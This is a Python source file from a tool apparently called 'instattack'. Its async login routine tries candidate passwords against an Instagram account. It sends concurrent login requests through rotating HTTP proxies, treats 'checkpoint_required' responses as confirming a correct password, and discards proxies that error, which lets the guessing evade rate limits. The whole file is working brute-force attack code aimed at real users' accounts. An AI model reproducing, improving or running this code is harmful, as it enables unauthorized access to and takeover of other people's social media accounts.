import asyncio

from instattack.lib import logger
from instattack.config import config

from instattack.app.models import InstagramResult
from instattack.app.exceptions import (InstagramResultError, HTTP_RESPONSE_ERRORS,
    HTTP_REQUEST_ERRORS)

from .client import client


async def attempt_login(
    loop,
    session,
    token,
    password,
    proxy,
    on_proxy_response_error,
    on_proxy_request_error,
    on_proxy_success,
):
    """
    For a given password, makes a series of concurrent requests, each using
    a different proxy, until a result is found that authenticates or dis-
    authenticates the given password.

    [x] TODO
    --------
    Only remove proxy if the error has occured a certain number of times, we
    should allow proxies to occasionally throw a single error.

    [x] TODO
    --------
    We shouldn't really need this unless we are running over large numbers
    of requests... so hold onto code.  Large numbers of passwords might lead
    to this RuntimeError:

    RuntimeError: File descriptor 87 is used by transport
    <_SelectorSocketTransport fd=87 read=polling write=<idle, bufsize=0>>

    >>> except RuntimeError as e:
    >>>     if e.errno == 87:
    >>>         e = HttpFileDescriptorError(original=e)
    >>>         await self.communicate_request_error(e, proxy, scheduler)
    >>>     else:
    >>>         raise e
    """
    log = logger.get_async(__name__, subname='login')

    proxy.update_time()

    async def parse_response_result(result, password, proxy):
        """
        Raises an exception if the result that was in the response is either
        non-conclusive or has an error in it.

        If the result does not have an error and is non conslusive, than we
        can assume that the proxy was most likely good.
        """
        result = InstagramResult.from_dict(result, proxy=proxy, password=password)
        if result.has_error:
            raise InstagramResultError(result.error_message)
        else:
            if not result.conclusive:
                raise InstagramResultError("Inconslusive result.")
            return result

    async def raise_for_result(response):
        """
        Since a 400 response will have valid json that can indicate an authentication,
        via a `checkpoint_required` value, we cannot raise_for_status until after
        we try to first get the response json.
        """
        if response.status != 400:
            response.raise_for_status()
            json = await response.json()
            result = await parse_response_result(json, password, proxy)
            return result
        else:
            # Parse JSON First
            json = await response.json()
            try:
                return await parse_response_result(json, password, proxy)  # noqa
            except InstagramResultError as e:
                # Be Careful: If this doesn't raise a response the result will be None.
                response.raise_for_status()

    try:
        async with client.instagram_post(
            session=session,
            token=token,
            username=loop.user.username,
            password=password,
            proxy=proxy  # Only Http Proxies Are Supported by AioHTTP
        ) as response:
            try:
                result = await raise_for_result(response)

            except HTTP_RESPONSE_ERRORS as e:
                if config['log.logging'].get('request_errors') is True:
                    await log.error(e, extra={'proxy': proxy})
                await on_proxy_response_error(proxy, e)

            else:
                await on_proxy_success(proxy)
                return result

    except asyncio.CancelledError:
        pass

    except HTTP_REQUEST_ERRORS as e:
        if config['log.logging'].get('request_errors') is True:
            await log.error(e, extra={'proxy': proxy})
        await on_proxy_request_error(proxy, e)
